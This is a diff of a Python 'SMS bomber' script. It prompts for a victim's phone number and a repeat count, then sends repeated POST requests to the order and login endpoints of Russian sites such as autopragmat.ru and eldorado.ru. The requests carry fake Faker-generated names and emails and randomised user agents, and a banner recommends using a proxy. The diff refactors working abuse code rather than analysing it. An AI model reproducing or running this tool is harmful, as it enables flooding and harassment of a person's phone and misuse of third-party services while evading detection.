@@ -1,27 +1,54 @@
-import formats
-from banners import *
-from formats import *
-import requests
-import random
 import json
-import fake_useragent
 import time
 
-with (open("male_names_rus.txt", "r", encoding="UTF-8") as f,
-      open("usernames_gmail.com.txt", "r", encoding="UTF-8") as f2,
-      open("cfg.json", "r", encoding="UTF-8") as config):
-    names = f.read().splitlines()
-    emails = f2.read().splitlines()
+import requests
+from faker import Faker
+
+
+def format_dash(phone_number: str) -> str:
+    """+7(953)-531-58-53"""
+    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
+    phone_number = ("+" + phone_number[:1] + "(" + phone_number[1:4] + ")" + "-" + phone_number[4:7] + "-" +
+                    phone_number[7:9] + "-" + phone_number[9:11])
+    return str(phone_number)
+
+
+def format_spaces(phone_number: str) -> str:
+    """+7 (953) 531 58 53"""
+    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
+    phone_number = ("+" + phone_number[:1] + " (" + phone_number[1:4] + ")" + " " + phone_number[4:7] + " " +
+                    phone_number[7:9] + " " + phone_number[9:11])
+    return str(phone_number)
+
+
+def format_spaces_without_braces(phone_number: str) -> str:
+    """+7 953 531 5853"""
+    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
+    phone_number = ("+" + phone_number[:1] + " " + phone_number[1:4] + " " + phone_number[4:7] + " " +
+                    phone_number[7:11])
+    return str(phone_number)
+
+
+def format_plus(phone_number: str) -> str:
+    """79535315853"""
+    return phone_number[1:12]
+
+
+def format_plus_8(phone_number: str) -> str:
+    """89535315853"""
+    return "8" + phone_number[1:12]
+
+
+faker = Faker(locale="ru")
+
+with open("cfg.json", "r", encoding="UTF-8") as config:
     cfg = json.load(config)
 
 if cfg["user-agent"] == "":
     print("Would you like to use a custom user agent? You can change it whenever you want in cfg.json file.\n"
-          "Put \"random\" in there, if you want to use random user agent.")
+          "Put \"__random__\" in there, if you want to use random user agent.")
     a = input("User agent (leave empty for random): ")
-    if a == "":
-        cfg["user-agent"] = "random"
-    else:
-        cfg["user-agent"] = a
+    cfg["user-agent"] = "__random__" if a == "" else a
     with open("cfg.json", "w", encoding="UTF-8") as config:
         json.dump(cfg, config, indent=4)
     del a
@@ -29,8 +56,17 @@ if cfg["user-agent"] == "":
 with open("cfg.json", "r", encoding="UTF-8") as config:
     cfg = json.load(config)
 while True:
-    bomb16()
-    print("it's better to use proxy")
+
+    print("""
+     ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓███████▓▒░ 
+    ░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░▒▓█▓▒░        
+    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓█▓▒░        
+    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓███████▓▒░  
+    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+    ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+     ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░  
+                                         
+    it's better to use proxy""")
 
     while True:
         NUMBER = input("Phone number (+79000000000 format): ")
@@ -50,8 +86,8 @@ while True:
 
     for i in range(RANGE):
         print(f"Starting cycle {i}")
-        if cfg["user-agent"].lower() == "random" or cfg["user-agent"] == "":
-            HEADERS = {'user_agent': fake_useragent.UserAgent().random}
+        if cfg["user-agent"].lower() == "__random__" or cfg["user-agent"] == "":
+            HEADERS = {'user_agent': faker.user_agent()}
             print(f"{HEADERS['user_agent']} was selected as user agent for this cycle")
         else:
             HEADERS = {'user_agent': cfg["user-agent"]}
@@ -97,9 +133,9 @@ while True:
         try:
             response = requests.post('https://autopragmat.ru/api/v1/send-order/',
                                      headers=HEADERS,
-                                     data={"name": f"{random.choice(names)}",
+                                     data={"name": f"{faker.name()}",
                                            "tel": f"{format_plus_8(NUMBER)}",
-                                           "email": f"{random.choice(emails)}", "program": "All"})
+                                           "email": f"{faker.email(safe=False)}", "program": "All"})
             print("[+] ratata.ru")
         except Exception as ex:
             print(f'ERROR: {ex}')
@@ -156,7 +192,7 @@ while True:
         try:
             response = requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php',
                                      headers=HEADERS,
-                                     json={"user_login": formats.format_spaces_without_braces(NUMBER),
+                                     json={"user_login": format_spaces_without_braces(NUMBER),
                                            "reregistration": "0",
                                            "organization": "0"})
             print("[+] eldorado.ru")
